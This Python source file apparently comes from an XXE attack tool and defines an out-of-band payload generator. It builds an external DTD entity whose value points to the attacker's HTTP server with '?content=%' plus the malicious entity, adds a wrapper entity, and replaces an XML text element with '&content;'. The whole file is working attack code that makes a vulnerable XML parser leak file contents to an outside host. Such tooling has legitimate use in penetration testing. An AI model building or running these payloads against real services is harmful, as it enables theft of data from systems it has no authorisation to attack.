from typing import Sequence, Union

from xeely.custom_xml import XMLEntity
from xeely.xxe.attack.mode import XXEAttackMode
from xeely.xxe.attack.payload.abstract import AbstractBlindPayloadGenerator
from xeely.xxe.attack.payload.factory import payload_factory


@payload_factory.register(name=XXEAttackMode.OOB.value)
class OOBPayloadGenerator(AbstractBlindPayloadGenerator):
    def _get_dtd_entity_value(self) -> str:
        if self._http_server_params is None:
            return ""

        return f"{self._http_server_params.get_base_url()}/?content=%{self.MALICIOUS_ENTITY_NAME};"

    def get_dtd_file_name(self) -> str:
        return "oob.dtd"

    def _get_payload_entities(self) -> Sequence[Union[XMLEntity,str]]:
        return [*self._get_base_payload_entities(), "%wrapper;"]

    def _modify_xml_content(self):
        super()._modify_xml_content()

        text_element = self._base_xml.get_text_elements()[0]
        self._base_xml.change_text_element_value(text_element.get_name(), "&content;")
